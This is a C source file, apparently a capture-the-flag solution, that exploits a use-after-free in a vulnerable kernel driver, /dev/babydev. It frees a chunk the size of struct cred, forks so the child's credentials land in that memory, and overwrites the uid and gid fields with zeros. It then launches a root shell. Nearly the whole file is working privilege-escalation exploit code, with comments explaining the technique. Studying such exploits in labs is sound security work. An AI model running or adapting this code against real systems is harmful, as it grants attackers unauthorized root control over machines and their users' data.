#include <sys/wait.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

int main()
{
    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    
    /* use UAF to overwrite cred */

    // allocate 0xa8 chunk, which is the size of struct cred
    ioctl(fd1, 0x10001, 0xa8);
    
    close(fd1); // Although fd1 was closed, fd2 operation still can write chunk

    int pid = fork();

    // when we create new process, kernel will allocate a new struct cred to the process, which is the memory we just releases
    if (pid < 0) {
        die("fork fail");
    } else if (pid > 0) { // parent
        wait(NULL);
    } else { // child
		/*
		struct cred {
			atomic_t    usage; // 4 bytes
		#ifdef CONFIG_DEBUG_CREDENTIALS
			atomic_t    subscribers;    // number of processes subscribed // 4 bytes
			void        *put_addr; // 8bytes

			-------------------------------- <- + 0x10

			unsigned    magic; // 4 bytes
		#define CRED_MAGIC  0x43736564
		#define CRED_MAGIC_DEAD 0x44656144
		#endif
			kuid_t      uid;        // real UID of the task // 4 bytes
			kgid_t      gid;        // real GID of the task // 4 bytes
			kgid_t      suid;       // saved UID of the task // 4 bytes
			kgid_t		sgid;		// saved GID of the task // 4 bytes
			kuid_t		euid;		// effective UID of the task // 4 bytes
			kgid_t		egid;		// effective GID of the task // 4 bytes
			...
		*/
        char s[28] = {0};
        write(fd2, s, 28); // overwrite uid, gid, suid, sgid, euid, egid

		printf("[*] Overwrited uid and gid\n");
		
		if (getuid() == 0) {
			printf("[*] Get root");
			system("/bin/sh");
			
			exit(1);
		}
    }


    return 0;
}
